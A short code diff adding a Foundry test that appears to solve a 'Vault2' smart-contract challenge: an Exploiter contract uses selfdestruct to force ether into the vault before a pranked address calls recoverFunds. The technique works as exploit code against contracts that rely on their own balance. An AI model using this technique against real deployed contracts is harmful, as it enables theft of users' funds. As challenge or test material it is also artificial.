@@ -11,4 +11,19 @@ contract Vault2Test is Test {
     function setUp() public {
         vault = new Vault2{value: 0.0001 ether}();
     }
+
+    function testVault2() public {
+        Exploiter exploiter = new Exploiter();
+        exploiter.destroy{value: 0.0001 ether}(address(vault));
+
+        address me = makeAddr("ceseshi");
+        vm.prank(me);
+        vault.recoverFunds();
+    }
+}
+
+contract Exploiter {
+    function destroy(address vault) public payable {
+        selfdestruct(payable(vault));
+    }
 }
